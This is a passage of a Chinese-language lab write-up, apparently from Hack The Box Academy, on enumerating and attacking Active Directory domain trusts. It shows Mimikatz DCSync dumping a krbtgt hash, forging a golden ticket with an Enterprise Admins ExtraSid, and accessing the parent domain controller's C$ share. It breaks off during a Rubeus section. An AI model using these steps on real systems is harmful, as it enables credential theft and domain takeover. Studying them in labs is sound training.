<h2 id="枚举信任关系"><a href="#枚举信任关系" class="headerlink" title="枚举信任关系"></a>枚举信任关系</h2><h3 id="使用-Get-ADTrust"><a href="#使用-Get-ADTrust" class="headerlink" title="使用 Get-ADTrust"></a>使用 Get-ADTrust</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> activedirectory</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : f48a1169<span class="literal">-2e58-42c1-ba32-a6ccb10057ec</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">1597717</span>f<span class="literal">-89b7-49b8-9cd9-0801d52475ca</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainTrust-检查现有信任关系"><a href="#使用-Get-DomainTrust-检查现有信任关系" class="headerlink" title="使用 Get-DomainTrust 检查现有信任关系"></a>使用 Get-DomainTrust 检查现有信任关系</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainTrust</span> </span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainTrustMapping"><a href="#使用-Get-DomainTrustMapping" class="headerlink" title="使用 Get-DomainTrustMapping"></a>使用 Get-DomainTrustMapping</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainTrustMapping</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">08</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">41</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainUser-检查子域中的用户"><a href="#使用-Get-DomainUser-检查子域中的用户" class="headerlink" title="使用 Get-DomainUser 检查子域中的用户"></a>使用 Get-DomainUser 检查子域中的用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Domain</span> LOGISTICS.INLANEFREIGHT.LOCAL | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">htb<span class="literal">-student_adm</span></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">lab_adm</span><br><span class="line">krbtgt</span><br></pre></td></tr></table></figure>

<h3 id="使用-netdom-查询域信任"><a href="#使用-netdom-查询域信任" class="headerlink" title="使用 netdom 查询域信任"></a>使用 netdom 查询域信任</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">netdom</span> <span class="title">query</span> /<span class="title">domain:inlanefreight</span>.<span class="title">local</span> <span class="title">trust</span></span></span><br><span class="line"><span class="function"><span class="title">Direction</span> <span class="title">Trusted</span>\<span class="title">Trusting</span> <span class="title">domain</span>                         <span class="title">Trust</span> <span class="title">type</span></span></span><br><span class="line"><span class="function">========= =======================                         ==========</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;-&gt;       <span class="title">LOGISTICS.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"><span class="title">Direct</span></span></span><br><span class="line"><span class="function"> <span class="title">Not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;-&gt;       <span class="title">FREIGHTLOGISTICS.LOCAL</span></span></span><br><span class="line"><span class="function"><span class="title">Direct</span></span></span><br><span class="line"><span class="function"> <span class="title">Not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-netdom-查询域控制器"><a href="#使用-netdom-查询域控制器" class="headerlink" title="使用 netdom 查询域控制器"></a>使用 netdom 查询域控制器</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">netdom</span> <span class="title">query</span> /<span class="title">domain:inlanefreight</span>.<span class="title">local</span> <span class="title">dc</span></span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">domain</span> <span class="title">controllers</span> <span class="title">with</span> <span class="title">accounts</span> <span class="title">in</span> <span class="title">the</span> <span class="title">domain</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-netdom-查询工作站和服务器"><a href="#使用-netdom-查询工作站和服务器" class="headerlink" title="使用 netdom 查询工作站和服务器"></a>使用 netdom 查询工作站和服务器</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">netdom</span> <span class="title">query</span> /<span class="title">domain:inlanefreight</span>.<span class="title">local</span> <span class="title">workstation</span></span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">workstations</span> <span class="title">with</span> <span class="title">accounts</span> <span class="title">in</span> <span class="title">the</span> <span class="title">domain</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">MS01</span></span></span><br><span class="line"><span class="function"><span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">MX01</span>      ( <span class="title">Workstation</span> <span class="title">or</span> <span class="title">Server</span> )</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SQL01</span>      ( <span class="title">Workstation</span> <span class="title">or</span> <span class="title">Server</span> )</span></span><br><span class="line"><span class="function"><span class="title">ILF</span>-<span class="title">XRG</span>      ( <span class="title">Workstation</span> <span class="title">or</span> <span class="title">Server</span> )</span></span><br><span class="line"><span class="function"><span class="title">MAINLON</span>      ( <span class="title">Workstation</span> <span class="title">or</span> <span class="title">Server</span> )</span></span><br><span class="line"><span class="function"><span class="title">CISERVER</span>      ( <span class="title">Workstation</span> <span class="title">or</span> <span class="title">Server</span> )</span></span><br><span class="line"><span class="function"><span class="title">INDEX</span>-<span class="title">DEV</span>-<span class="title">LON</span>      ( <span class="title">Workstation</span> <span class="title">or</span> <span class="title">Server</span> )</span></span><br><span class="line"><span class="function">...<span class="title">SNIP</span>...</span></span><br></pre></td></tr></table></figure>

<h2 id="攻击域信任-子域-父域信任"><a href="#攻击域信任-子域-父域信任" class="headerlink" title="攻击域信任 - 子域 -&gt; 父域信任"></a>攻击域信任 - 子域 -&gt; 父域信任</h2><h3 id="使用-Mimikatz-获取-KRBTGT-账户的-NT-哈希"><a href="#使用-Mimikatz-获取-KRBTGT-账户的-NT-哈希" class="headerlink" title="使用 Mimikatz 获取 KRBTGT 账户的 NT 哈希"></a>使用 Mimikatz 获取 KRBTGT 账户的 NT 哈希</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt;  mimikatz <span class="comment"># lsadump::dcsync /user:LOGISTICS\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">33</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">69</span>df324191d4a80f0ed100c10f20561e</span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainSID"><a href="#使用-Get-DomainSID" class="headerlink" title="使用 Get-DomainSID"></a>使用 Get-DomainSID</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainGroup-获取企业管理员组的-SID"><a href="#使用-Get-DomainGroup-获取企业管理员组的-SID" class="headerlink" title="使用 Get-DomainGroup 获取企业管理员组的 SID"></a>使用 Get-DomainGroup 获取企业管理员组的 SID</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> INLANEFREIGHT.LOCAL <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid                                    </span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span>                                    </span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-Mimikatz-创建黄金票据"><a href="#使用-Mimikatz-创建黄金票据" class="headerlink" title="使用 Mimikatz 创建黄金票据"></a>使用 Mimikatz 创建黄金票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span></span><br><span class="line">User      : hacker</span><br><span class="line">Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)</span><br><span class="line">SID       : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">User Id   : <span class="number">500</span></span><br><span class="line">Groups Id : *<span class="number">513</span> <span class="number">512</span> <span class="number">520</span> <span class="number">518</span> <span class="number">519</span></span><br><span class="line">Extra SIDs: S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span> ;</span><br><span class="line">ServiceKey: <span class="number">9</span>d765b482771505cbe97411065964d5f - rc4_hmac_nt</span><br><span class="line">Lifetime  : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM ; <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM ; <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;hacker @ LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> successfully submitted <span class="keyword">for</span> current session</span><br></pre></td></tr></table></figure>

<h3 id="使用-klist-确认内存中的-Kerberos-票据"><a href="#使用-klist-确认内存中的-Kerberos-票据" class="headerlink" title="使用 klist 确认内存中的 Kerberos 票据"></a>使用 klist 确认内存中的 Kerberos 票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>xf6462</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        Renew Time: <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br></pre></td></tr></table></figure>

<h3 id="列出域控制器的整个-C-盘"><a href="#列出域控制器的整个-C-盘" class="headerlink" title="列出域控制器的整个 C:盘"></a>列出域控制器的整个 C:盘</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span> has no label.</span><br><span class="line"> Volume Serial Number is B8B3<span class="literal">-0D72</span></span><br><span class="line"></span><br><span class="line"> Directory of \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="number">09</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">12</span>:<span class="number">19</span> AM    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">10</span>/<span class="number">06</span>/<span class="number">2021</span>  <span class="number">01</span>:<span class="number">50</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">09</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">02</span>:<span class="number">06</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">11</span>/<span class="number">19</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">17</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Shares</span><br><span class="line"><span class="number">10</span>/<span class="number">06</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">31</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">03</span>/<span class="number">21</span>/<span class="number">2022</span>  <span class="number">12</span>:<span class="number">18</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> File(s)              <span class="number">0</span> bytes</span><br><span class="line">               <span class="number">6</span> <span class="built_in">Dir</span>(s)  <span class="number">18</span>,<span class="number">080</span>,<span class="number">178</span>,<span class="number">176</span> bytes free</span><br></pre></td></tr></table></figure>

<h2 id="ExtraSids-攻击-Rubeus"><a href="#ExtraSids-攻击-Rubeus" class="headerlink" title="ExtraSids 攻击 - Rubeus"></a>ExtraSids 攻击 - Rubeus</h2><h3 id="使用-ls-确认无访问权限后再运行-Rubeus"><a href="#使用-ls-确认无访问权限后再运行-Rubeus" class="headerlink" title="使用 ls 确认无访问权限后再运行 Rubeus"></a>使用 ls 确认无访问权限后再运行 Rubeus</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> : Access is denied</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : PermissionDenied: (\\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span>:String) [<span class="built_in">Get-ChildItem</span>], UnauthorizedAcces </span><br><span class="line">   sException</span><br><span class="line">    + FullyQualifiedErrorId : 